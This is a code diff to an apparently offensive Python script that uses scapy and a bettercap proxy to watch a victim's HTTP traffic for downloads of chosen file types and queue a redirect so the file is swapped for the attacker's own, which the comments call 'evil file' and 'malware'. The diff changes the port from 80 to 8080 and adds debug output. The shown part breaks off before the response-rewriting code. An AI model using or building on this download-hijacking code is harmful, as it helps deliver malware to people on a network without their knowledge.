@@ -57,21 +57,27 @@ def process_packet(packet, extensions_to_replace, file_destination):
     packet_count += 1
 
     scapy_packet = scapy.IP(packet.get_payload())
+
+    # DEBUG LINE: Uncomment this to see if ANY traffic is hitting the script
+    print(f"Packet received: {scapy_packet.summary()}")
     
     if scapy_packet.haslayer(scapy.Raw):
         # OUTGOING REQUEST Check for file download
-        if scapy_packet[scapy.TCP].dport == 80: #Traffic supposed to flow through bettercap so 8080 proxy
-            if any(ext.encode() in scapy_packet[scapy.Raw].load for ext in extensions_to_replace):
-        
-                # Check if the user is already requesting our spoof file. Convert file_destination to bytes for comparison
-                if file_destination.encode() not in scapy_packet[scapy.Raw].load:
-                    print(f"[+] File type {ext} download detected. Queuing redirect...")
-                    ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
-                else:
-                    print("[-] Ignoring request for our own file to prevent loop.")
+        if scapy_packet[scapy.TCP].dport == 8080: #Traffic supposed to flow through bettercap so 8080 proxy
+            payload_content = scapy_packet[scapy.Raw].load
+            
+            for ext in extensions_to_replace:
+                if ext.encode() in payload_content:
+                    # Prevent looping by checking if we are requesting our own evil file
+                    if file_destination.encode() not in payload_content:
+                        print(f"[+] Target file ({ext}) download detected. Queuing redirect...")
+                        ack_dict[scapy_packet[scapy.TCP].ack] = time.time()
+                    else:
+                        print("[-] Ignoring request for our own malware.")
+                    break # Stop checking other extensions
 
         # INCOMING RESPONSE (Replace the file)
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 8080:
             current_seq = scapy_packet[scapy.TCP].seq
 
             if current_seq in ack_dict:
